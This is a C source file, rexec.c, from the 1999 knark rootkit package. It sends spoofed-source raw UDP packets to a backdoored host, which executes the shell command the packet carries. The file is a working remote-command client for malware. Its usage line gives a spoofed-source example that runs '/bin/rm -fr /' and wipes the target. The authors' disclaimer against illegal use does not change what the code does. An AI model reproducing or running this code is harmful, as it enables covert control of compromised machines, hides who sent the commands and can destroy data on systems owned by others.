/*
 * rexec.c, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 *
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 *
 * See README for more info.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "knark.h"

#define UDP_H sizeof(struct udphdr)
#define IP_H sizeof(struct ip)


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "\t%s <src_addr> <dst_addr> <command> [args ...]\n"
	    "ex: %s www.microsoft.com 192.168.1.77 /bin/rm -fr /\n",
	    progname, progname);
    exit(-1);
}


int open_raw_sock(void)
{
    int s, on = 1;
    
    if( (s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
	perror("SOCK_RAW"), exit(-1);
    
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
	perror("IP_HDRINCL"), exit(-1);
    
    return s;
}


struct in_addr resolv(char *hostname)
{
    struct in_addr in;
    struct hostent *hp;
    
    if( (in.s_addr = inet_addr(hostname)) == -1)
    {
	if( (hp = gethostbyname(hostname)) )
	    bcopy(hp->h_addr, &in.s_addr, hp->h_length);
	else {
	    herror("Can't resolv hostname");
	    exit(-1);
	}
    }

    return in;
}


int udp_send_rexec(int s,
		   struct in_addr *src,
		   struct in_addr *dst,
		   u_char *buf,
		   u_short datalen)
{
    u_char *packet, *data, *p;
    struct ip *ip;
    struct udphdr *udp;
    u_short psize;
    struct sockaddr_in sin;
    
    psize = IP_H + UDP_H + sizeof(u_long) + datalen;
    if( (packet = calloc(1, psize)) == NULL)
	perror("calloc"), exit(-1);
    
    ip     = (struct ip     *) packet;
    udp    = (struct udphdr *) (packet + IP_H);
    data   = (u_char        *) (packet + IP_H + UDP_H);
    
    srand(time(NULL));
    
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = dst->s_addr;
    sin.sin_port = htons(UDP_REXEC_DSTPORT);

    ip->ip_hl         = IP_H >> 2;
    ip->ip_v          = IPVERSION;
    ip->ip_len        = htons(psize);
    ip->ip_id         = ~rand()&0xffff;
    ip->ip_ttl        = 63;
    ip->ip_p          = IPPROTO_UDP;
    ip->ip_src.s_addr = src->s_addr;
    ip->ip_dst.s_addr = dst->s_addr;
    
    udp->source = htons(UDP_REXEC_SRCPORT);
    udp->dest   = htons(UDP_REXEC_DSTPORT);
    udp->len    = htons(UDP_H + sizeof(u_long) + datalen);
    
    p = data;
    *(u_long *)p = UDP_REXEC_USERPROGRAM;
    p += sizeof(u_long);
    memcpy(p, buf, datalen);
    
    if(sendto(s, packet, psize, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	perror("sendto"), exit(-1);
    
    return psize;
}


int main(int argc, char *argv[])
{
    int s, i, len;
    u_char cmd[IP_MSS];
    struct in_addr src, dst;
    
    author_banner("rexec.c");
    
    if(argc < 4)
	usage(argv[0]);
    
    src = resolv(argv[1]);
    dst = resolv(argv[2]);
    
    s = open_raw_sock();
    
    len = snprintf(cmd, IP_MSS, "%s", argv[3]);
    for(i = 4; i < argc && len < IP_MSS; i++)
	len += snprintf(cmd+len, IP_MSS-len, "%c%s", SPACE_REPLACEMENT,
			argv[i]);
    cmd[len] = '\0';
    
    udp_send_rexec(s, &src, &dst, cmd, len);
    for(i = 0; cmd[i]; i++)
	if(cmd[i] == SPACE_REPLACEMENT)
	    cmd[i] = ' ';
    printf("Done. exec \"%s\" requested on %s from %s\n",
	   cmd, argv[2], argv[1]);
    
    exit(0);
}
